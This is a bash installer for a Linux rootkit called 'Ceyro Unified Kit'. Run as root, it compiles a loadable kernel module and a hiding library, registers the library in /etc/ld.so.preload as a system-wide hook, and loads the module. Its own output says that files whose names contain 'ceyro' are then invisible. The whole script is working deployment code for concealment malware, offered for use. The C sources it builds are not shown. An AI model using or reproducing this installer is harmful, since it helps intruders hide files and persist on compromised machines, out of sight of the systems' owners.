#!/bin/bash

# Colors for better readability
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}[*] Starting Ceyro Unified Kit Setup (LKM + LD_PRELOAD)...${NC}"

# 1. Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run with sudo or as root.${NC}"
    exit 1
fi

# 2. Detect package manager
detect_pkg_manager() {
    if command -v pacman &>/dev/null; then
        PKG_MANAGER="pacman"
    elif command -v apt &>/dev/null; then
        PKG_MANAGER="apt"
    elif command -v dnf &>/dev/null; then
        PKG_MANAGER="dnf"
    elif command -v zypper &>/dev/null; then
        PKG_MANAGER="zypper"
    elif command -v emerge &>/dev/null; then
        PKG_MANAGER="emerge"
    else
        echo -e "${RED}[!] No supported package manager found.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Detected package manager: ${PKG_MANAGER}${NC}"
}

install_deps() {
    case "$PKG_MANAGER" in
        pacman)
            pacman -Sy --noconfirm base-devel linux-headers
            ;;
        apt)
            apt update -y && apt install -y build-essential linux-headers-$(uname -r) gcc
            ;;
        dnf)
            dnf install -y gcc make kernel-devel-$(uname -r)
            ;;
        zypper)
            zypper install -y gcc make kernel-devel
            ;;
        emerge)
            emerge --ask=n sys-kernel/linux-headers sys-devel/gcc sys-devel/make
            ;;
    esac

    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Failed to install dependencies.${NC}"
        exit 1
    fi
}

# 3. Determine script directory automatically
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
echo -e "${BLUE}[*] Project directory: ${SCRIPT_DIR}${NC}"

# Check for required source files
for file in ceyro_kit.c hide.c Makefile; do
    if [ ! -f "${SCRIPT_DIR}/$file" ]; then
        echo -e "${RED}[!] Error: $file is missing from '${SCRIPT_DIR}'!${NC}"
        exit 1
    fi
done

# 4. Install dependencies
echo -e "${BLUE}[*] Detecting package manager...${NC}"
detect_pkg_manager
echo -e "${BLUE}[*] Installing required build tools...${NC}"
install_deps

# 5. Clean up previous installations
echo -e "${BLUE}[*] Cleaning up old instances...${NC}"
if lsmod | grep -q "ceyro_kit"; then
    rmmod ceyro_kit
fi
if [ -f /etc/ld.so.preload ]; then
    # Remove old entry if present
    sed -i '/\/usr\/local\/lib\/hide\.so/d' /etc/ld.so.preload
fi
make -C "${SCRIPT_DIR}" clean

# 6. Compile LKM and shared library
echo -e "${BLUE}[*] Compiling components...${NC}"
make -C "${SCRIPT_DIR}"
if [ ! -f "${SCRIPT_DIR}/ceyro_kit.ko" ] || [ ! -f "${SCRIPT_DIR}/hide.so" ]; then
    echo -e "${RED}[!] Compilation failed.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Compilation successful!${NC}"

# 7. Set up user-space hiding via LD_PRELOAD
echo -e "${BLUE}[*] Copying hide.so to /usr/local/lib/ and enabling global hook...${NC}"
cp "${SCRIPT_DIR}/hide.so" /usr/local/lib/hide.so
echo "/usr/local/lib/hide.so" >> /etc/ld.so.preload
echo -e "${GREEN}[+] User-space hiding active. Files containing 'ceyro' in their name are now invisible!${NC}"

# 8. Load kernel module
echo -e "${BLUE}[*] Loading kernel module (LKM)...${NC}"
insmod "${SCRIPT_DIR}/ceyro_kit.ko"
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Failed to load kernel module.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Kernel module loaded successfully.${NC}"

# 9. Print kernel log
echo -e "${BLUE}[*] Reading kernel log (dmesg):${NC}"
echo -e "${GREEN}"
dmesg | tail -n 15
echo -e "${NC}"

echo -e "${BLUE}[*] To fully remove, use the uninstall commands (see README).${NC}"
